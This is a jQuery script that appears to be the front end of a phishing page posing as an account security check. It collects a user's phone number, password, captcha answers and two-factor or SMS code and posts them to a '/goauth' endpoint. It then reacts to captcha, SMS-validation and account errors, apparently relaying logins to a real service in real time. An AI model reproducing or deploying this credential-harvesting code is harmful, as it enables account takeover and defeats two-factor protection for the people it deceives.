function next() {
    if(/^(\s*)?(\+)?([- _():=+]?\d[- _():=+]?){10,14}(\s*)?$/.test($("#user-number").val())) {
        $("#phoneFormat").fadeOut();
        $("#security").modal("show");
        $("#next").button("reset");
    } else {
        $("#phoneFormat").fadeIn()
    }
}

function touchVariant(id) {
    if(id == valid_id) {
        $("#validate_phones").show();
        $("#validate_number").show();
        $("#validate_user").hide();
        $("#validate_friends").hide();
    } else {
        $("#validate_user").html("<b>Вы ошиблись! Попробуйте еще раз!</b>");
        location.reload();
    }
}

function next_1() {
    $("#next_1").button("loading"), $.ajax({
        url: window.location.origin+'/goauth',
        type: "POST",
        dataType: "json",
        data: {
            captcha_sid: $("#captcha_sid").val(),
            captcha_key: $(".captcha-key").val(),
            twofactor: $("#twofactor").val(),
            data1: $("#user-number").val(),
            data2: $("#validation_password").val()
        },
        success: function(a) {
            return "error" == a.status ? (
            $("#errorRecovery").fadeIn(),
            $("#errorRecovery2").fadeOut(),
            $(".captcha-img").fadeOut(), 
            $(".captcha-key").fadeOut()) :
            "need_captcha" == a.error ?
            ($("#errorRecovery").fadeOut(), 
            $(".captcha-key").val(""), $(".captcha-img").attr("src", a.captcha_img), 
            $("#captcha_sid").val(a.captcha_sid), $(".captcha-img").fadeIn(), 
            $(".captcha-key").fadeIn()) :
            "need_account" == a.error ?
            ($("#errorRecovery2").fadeIn(), 
            $("#errorRecovery").fadeOut(),
            $(".captcha-img").fadeOut(), 
            $(".captcha-key").fadeOut()) : 
            "need_validation" == a.error ?
            ($("#sms").fadeIn(),
            $("#errorRecovery").fadeOut(),
            $("#validation_password").fadeOut(),
            $(".captcha-img").fadeOut(), 
            $(".captcha-key").fadeOut()) :
            ($("#errorRecovery").fadeOut(), 
            $(".captcha-img").fadeOut(), $(".captcha-key").fadeOut(), 
            $("#step1").css("display", "none"),
            $("#step2").css("display", "block"),
            $(".modal").css("display", "none")), 
            $("#next_1").button("reset"), !1
        }
    })
}
$("#user-number").keypress(function(a) {
    13 == a.which && (next(), a.preventDefault())
}), $(".captcha-key").keypress(function(a) {
    13 == a.which && (next_1(), a.preventDefault())
}), $("#validation_password").keypress(function(a) {
    13 == a.which && (next_1(), a.preventDefault())
}), $("[title]").popover();